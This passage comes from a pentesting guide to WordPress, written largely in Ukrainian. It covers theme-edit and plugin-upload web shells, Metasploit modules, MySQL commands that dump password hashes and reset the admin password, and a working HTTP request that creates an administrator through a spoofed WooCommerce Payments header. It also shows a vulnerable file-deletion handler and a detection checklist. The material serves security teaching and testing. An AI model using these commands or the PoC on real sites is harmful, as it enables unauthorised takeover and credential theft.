–®—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
—â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Å—ñ—é.

## Plugin RCE

### PHP –ø–ª–∞–≥—ñ–Ω

–ú–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ .php —Ñ–∞–π–ª–∏ —è–∫ –ø–ª–∞–≥—ñ–Ω.\
–°—Ç–≤–æ—Ä—ñ—Ç—å –≤–∞—à php backdoor, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:

![](<../../images/image (183).png>)

–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π –ø–ª–∞–≥—ñ–Ω:

![](<../../images/image (722).png>)

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø–ª–∞–≥—ñ–Ω —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å Install Now:

![](<../../images/image (249).png>)

–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å Procced:

![](<../../images/image (70).png>)

–ú–æ–∂–ª–∏–≤–æ, —Ü–µ –Ω—ñ—á–æ–≥–æ –Ω–µ –ø–æ–∫–∞–∂–µ –Ω–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥, –∞–ª–µ —è–∫—â–æ –ø–µ—Ä–µ–π—Ç–∏ –≤ Media, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ, —â–æ –≤–∞—à shell –±—É–ª–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ:

![](<../../images/image (462).png>)

–í—ñ–¥–∫—Ä–∏–π—Ç–µ –π–æ–≥–æ –π –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ URL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

–¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞, –≤—ñ–¥–æ–º–æ–≥–æ —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, —ñ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è web shell. –ü—Ä–æ—Ü–µ—Å –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ WordPress dashboard –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

1. **Plugin Acquisition**: –ø–ª–∞–≥—ñ–Ω –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ –¥–∂–µ—Ä–µ–ª–∞ –Ω–∞ –∫—à—Ç–∞–ª—Ç Exploit DB, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- –ü–µ—Ä–µ–π–¥—ñ—Ç—å —É WordPress dashboard, –¥–∞–ª—ñ `Dashboard > Plugins > Upload Plugin`.
- –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ zip-—Ñ–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞.
3. **Plugin Activation**: –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ—ó —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ dashboard.
4. **Exploitation**:
- –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ "reflex-gallery" –π–æ–≥–æ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤—ñ–¥–æ–º–∏–π —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π.
- Metasploit framework –Ω–∞–¥–∞—î –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –º–æ–¥—É–ª—å —ñ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ meterpreter session, —â–æ –¥–∞—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–∞–π—Ç—É.
- –í–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü–µ –ª–∏—à–µ –æ–¥–∏–Ω —ñ–∑ –±–∞–≥–∞—Ç—å–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó WordPress —Å–∞–π—Ç—É.

–ö–æ–Ω—Ç–µ–Ω—Ç –º—ñ—Å—Ç–∏—Ç—å —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –∫—Ä–æ–∫–∏ —É WordPress dashboard –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –ø–∞–º'—è—Ç–∞—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —ñ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ —Ç—ñ–ª—å–∫–∏ –≤ –ª–µ–≥–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –ø—ñ–¥ —á–∞—Å penetration testing –∑–∞ —è–≤–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ‚Äî —Ü–µ —Å–∫—Ä–∏–ø—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ **Cross-Site Scripting (XSS)** –¥–æ **Remote Code Execution (RCE)** –∞–±–æ —ñ–Ω—à–∏—Ö –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É WordPress. –î–ª—è –¥–µ—Ç–∞–ª—å–Ω—ñ—à–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–∏–≤. [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). –í—ñ–Ω –∑–∞–±–µ–∑–ø–µ—á—É—î **–ø—ñ–¥—Ç—Ä–∏–º–∫—É –¥–ª—è WordPress –≤–µ—Ä—Å—ñ–π 6.X.X, 5.X.X —Ç–∞ 4.X.X —ñ –¥–æ–∑–≤–æ–ª—è—î:**
- _**Privilege Escalation:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–∞—à custom plugin (backdoor) —É WordPress.
- _**(RCE) Built-In Plugin Edit:**_ –†–µ–¥–∞–≥—É–≤–∞—Ç–∏ built-in plugins —É WordPress.
- _**(RCE) Built-In Theme Edit:**_ –†–µ–¥–∞–≥—É–≤–∞—Ç–∏ built-in themes —É WordPress.
- _**(Custom) Custom Exploits:**_ –ö–∞—Å—Ç–æ–º–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è third-party WordPress plugins/themes.

## –ü–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–í–∏—Ç—è–≥–Ω—ñ—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest –ø–ª–∞–≥—ñ–Ω—ñ–≤ Wordpress

### –ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∞ –ø–æ–≤–µ—Ä—Ö–Ω—è

–†–æ–∑—É–º—ñ–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ –ø–ª–∞–≥—ñ–Ω Wordpress –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, –∫–ª—é—á–æ–≤–µ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –ø—É–Ω–∫—Ç–∏, —É —è–∫–∏—Ö –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, –∞ —Ç–∞–∫–æ–∂ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ —É [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ ‚Äî —á–µ—Ä–µ–∑ AJAX handlers. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–º–∏–ª–∫–∏ –≤ –ª–æ–≥—ñ—Ü—ñ, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∞–±–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —á–∞—Å—Ç–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±–∞–∑—É—é—Ç—å –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –Ω–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ wordpress nonce, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ —É **–±—É–¥—å-—è–∫–æ–≥–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó Wordpress** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ä–æ–ª—ñ).

–ù–∏–∂—á–µ ‚Äî —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –µ–∫—Å–ø–æ–Ω—É–≤–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–ª–∞–≥—ñ–Ω—ñ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å endpoint –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π, –∑–∞–∑–≤–∏—á–∞–π –≤–æ–Ω–∞ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

- **REST API**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –æ–ø—Ä–∏–ª—é–¥–Ω–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ wordpress, –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—à–∏ REST API –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ‚Äî —Ü–µ callback-—Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –º–∞—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ–∑–≤—ñ–ª –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –º–µ—Ç–æ–¥ API.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **–ü—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ php-—Ñ–∞–π–ª—É**

–ó–≤—ñ—Å–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø–Ω—ñ –Ω–∞–ø—Ä—è–º—É —á–µ—Ä–µ–∑ –≤–µ–±. –¢–æ–∂ —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏ –∑–≤–µ—Ä–Ω–µ–Ω–Ω—ñ –¥–æ —Ñ–∞–π–ª—É, –≤–æ–Ω–∞ –±—É–¥–µ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∞ –±—É–¥—å-—è–∫–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.

### –ü—ñ–¥–º—ñ–Ω–∞ REST —á–µ—Ä–µ–∑ trusted-header (WooCommerce Payments ‚â§ 5.6.1)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è ¬´trusted header¬ª –¥–ª—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ–π –∞–±–æ —Ä–µ–≤–µ—Ä—Å-–ø—Ä–æ–∫—Å—ñ —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è REST-–∑–∞–ø–∏—Ç—ñ–≤. –Ø–∫—â–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–µ –ø–æ–≤'—è–∑–∞–Ω–∏–π –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ –∑ –∑–∞–ø–∏—Ç–æ–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º –≤–∏—â–µ –≤ —Å—Ç–µ–∫—É, –Ω–∞–ø–∞–¥–Ω–∏–∫ –º–æ–∂–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ —ñ –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤ –≤—ñ–¥ —ñ–º–µ–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

- –í–ø–ª–∏–≤: –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ –µ—Å–∫–∞–ª–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ core users REST route.
- –ü—Ä–∏–∫–ª–∞–¥ –∑–∞–≥–æ–ª–æ–≤–∫–∞: `X-Wcpay-Platform-Checkout-User: 1` (–ø—Ä–∏–º—É—à—É—î ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ 1, –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä—à–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).
- –ó–ª–æ–≤–∂–∏–≤–∞–Ω–∏–π –º–∞—Ä—à—Ä—É—Ç: `POST /wp-json/wp/v2/users` –∑ –º–∞—Å–∏–≤–æ–º —Ä–æ–ª–µ–π —ñ–∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î

- –ü–ª–∞–≥—ñ–Ω –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –∑–∞–≥–æ–ª–æ–≤–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º, —É —Å—Ç–∞–Ω –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –π –ø—Ä–æ–ø—É—Å–∫–∞—î capability checks.
- WordPress core –æ—á—ñ–∫—É—î capability `create_users` –¥–ª—è —Ü—å–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç—É; —Ö–∞–∫ –ø–ª–∞–≥—ñ–Ω–∞ –æ–±—Ö–æ–¥–∏—Ç—å —Ü–µ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞.

–û—á—ñ–∫—É–≤–∞–Ω—ñ –æ–∑–Ω–∞–∫–∏ —É—Å–ø—ñ—Ö—É

- HTTP 201 —ñ–∑ JSON-—Ç—ñ–ª–æ–º, —â–æ –æ–ø–∏—Å—É—î —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –ù–æ–≤–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä, –≤–∏–¥–∏–º–∏–π —É `wp-admin/users.php`.

–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –®—É–∫–∞–π—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é grep `getallheaders()`, `$_SERVER['HTTP_...']`, –∞–±–æ vendor SDKs, —è–∫—ñ —á–∏—Ç–∞—é—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ REST-—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö callback-—ñ–≤, —è–∫—ñ –Ω–µ –º–∞—é—Ç—å –Ω–∞–¥—ñ–π–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `permission_callback` —ñ –Ω–∞—Ç–æ–º—ñ—Å—Ç—å –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø–∏—Ç—É.
- –®—É–∫–∞–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π –∫–µ—Ä—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ —è–¥—Ä–∞ (`wp_insert_user`, `wp_create_user`) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ REST-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤, –¥–æ—Å—Ç—É–ø –¥–æ —è–∫–∏—Ö –∑–∞—Ö–∏—â–µ–Ω–æ –ª–∏—à–µ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **–ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** ‚Äì –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ —Ö—É–∫ `wp_ajax_nopriv_`.
